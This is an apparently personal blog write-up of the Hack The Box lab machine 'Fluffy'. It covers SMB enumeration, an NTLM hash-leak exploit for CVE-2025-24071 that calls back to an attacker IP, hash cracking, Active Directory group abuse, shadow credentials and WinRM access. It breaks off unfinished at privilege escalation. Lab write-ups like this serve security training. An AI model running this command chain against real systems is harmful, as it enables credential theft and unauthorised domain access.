---
title: 'HTB Fluffy Writeup'
date: 2025-07-03
permalink: /posts/2025/07/HTB_Fluffy_Writeup/
tags:
  - HTB
  - writeup
  - easy
---

A writeup of the Hack The Box machine "Fluffy" with easy difficulty

# HTB_Fluffy (stuck)

Hi welcome to this writeup of the Hack The Box machine Fluffy with easy difficulty. It is an active Windows machine from week 2 season 8.

![image.png](/images/HTB_Fluffy/image.png)

# Enumeration

I start with a Nmap scan: `nmap -sV -sC 10.10.11.69`

![image.png](/images/HTB_Fluffy/image%201.png)

A lot of ports, a LDAP with the domain `fluffy.htb0` and a subdomain `DC01.fluffy.htb` . So this machine is a domain controller in the `fluffy.htb` domain. There is also a SMB on port 445. Port 5985 is WinRM/HTTP so a remote PowerShell.

Let’s see if there are any public SMB shares: `smbclient -N -L \\10.10.11.69`

![image.png](/images/HTB_Fluffy/image%202.png)

These are default shares, except `IT`.

`smbclient //10.10.11.69/IT -N`

![image.png](/images/HTB_Fluffy/image%203.png)

There is authentication required.

Wait I forgot there is a hint: As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!

Let’s try these credentials:

`smbclient //10.10.11.69/IT -U "j.fleischman"`

![image.png](/images/HTB_Fluffy/image%204.png)

Yeah that worked. 

Everything is a search tool, KeePass is a password manager, very interesting. And an upgrade notice. 

`get Upgrade_Notice.pdf`

`get KeePass-2.58.zip`

![image.png](/images/HTB_Fluffy/image%205.png)

I had to change the local dir: `lcd /tmp`

Now I can download the files.

Going in the browser to: 

![image.png](/images/HTB_Fluffy/image%206.png)

Very interesting notice, recent CVEs. This hints that not everything is patched yet. The Severity of these CVE do not match with the actual CVEs. The highest severity is [CVE-2025-3445](https://nvd.nist.gov/vuln/detail/CVE-2025-3445). I don’t know if this pdf is a lead or just a distraction.

Let’s check the keePass zip from the SMB share:

![image.png](/images/HTB_Fluffy/image%207.png)

In `KeePass.exe.config` is the version: 

![image.png](/images/HTB_Fluffy/image%208.png)

Hmm until now we got user credentials, access to the SMB-share, seen the contents of the KeePass ZIP, the PDF has CVEs.

Let’s try if we can use the credentials on port 5985 Windows Remote Management:

`crackmapexec winrm 10.10.11.69 -u j.fleischman -p 'j0elTHEM4n1990!'`

![image.png](/images/HTB_Fluffy/image%209.png)

This means that the user can’t connect via WinRM. Dead end.

Let’s take a closer look at the CVE-2025-24071:

We have read and write permissions to the `IT` SMB share so we could exploit this CVE:

Let’s try Metasploit: https://github.com/FOLKS-iwd/CVE-2025-24071-msfvenom 

`git clone [https://github.com/FOLKS-IWD/CVE-2025-24071-msfvenom.git](https://github.com/FOLKS-IWD/CVE-2025-24071-msfvenom.git)`
`cd CVE-2025-24071-msfvenom`

Copy the module to the Metasploit modules dir:

`cp ntlm_hash_leak.rb ~/.msf4/modules/auxiliary/server/`

![image.png](/images/HTB_Fluffy/image%2010.png)

Load the module:

`use auxiliary/server/ntlm_hash_leak`

Set the options:
`set ATTACKER_IP 10.10.15.100` (local machine)

The rest can be left default.

`run`

![image.png](/images/HTB_Fluffy/image%2011.png)

The exploit.zip is now generated and:

![image.png](/images/HTB_Fluffy/image%2012.png)

Put this file on the target host:

![image.png](/images/HTB_Fluffy/image%2013.png)

Now use the following Metasploit module to collect the NTLM hashes:
`use auxiliary/server/capture/smb`
`set SRVHOST 10.10.15.100` (local machine)

`run`

![image.png](/images/HTB_Fluffy/image%2014.png)

And voila:

![image.png](/images/HTB_Fluffy/image%2015.png)

The user is `p.agila` as we can see. Let’s crack the hash:

`john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`

![image.png](/images/HTB_Fluffy/image%2016.png)

`prometheusx-303`

Now bloodhound comes into the play:

`bloodhound-python -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb -ns 10.10.11.69 -c ALL --zip`  

Start the database and Bloodhound:

`sudo neo4j start`

`./BloodHound-linux-x64/BloodHound`

unzip the bloodhound.zip and upload it in bloodhoud.

Search for the `managers@fluffy.htb` service account.

`bloodyAD --host '10.10.11.69' -d 'dc01.fluffy.htb' -u 'p.agila' -p 'prometheusx-303' add groupMember 'SERVICE ACCOUNTS' p.agila` 

![image.png](/images/HTB_Fluffy/image%2017.png)

The service accounts group has GenericWrite access. We put shadow credentials:

`certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303'  -account 'WINRM_SVC'  -dc-ip '10.10.11.69'`

Certipy is used to generate a certificate via shadow credentials for the account `WINRM_SVC` trough legitimate credentials of `p.agila@fluffy.htb` .

![image.png](/images/HTB_Fluffy/image%2018.png)

Oh… my time on my machine is too much of a difference with the DC.

I got stuck here unfortunately…

Now use Evil-WinRM:

`evil-winrm -i 10.10.11.69 -u 'winrm_svc' -H <NT hash>` 

The user flag can be found in the Desktop folder:

# Privilege Escalation